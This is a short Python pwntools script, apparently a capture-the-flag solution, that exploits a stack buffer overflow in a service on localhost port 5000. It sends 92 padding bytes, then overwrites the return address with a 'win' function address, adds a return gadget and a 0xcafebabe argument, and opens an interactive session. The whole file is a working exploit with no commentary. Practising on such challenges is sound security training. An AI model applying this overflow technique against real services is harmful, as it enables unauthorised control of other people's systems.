from pwn import *

p = remote('localhost', 5000)

ret = 0x080491b9
win = 0x08049186

payload = b"X"*92 + p32(win) + p32(ret) + p32(0xcafebabe)

pause()
p.sendline(payload)
p.interactive()
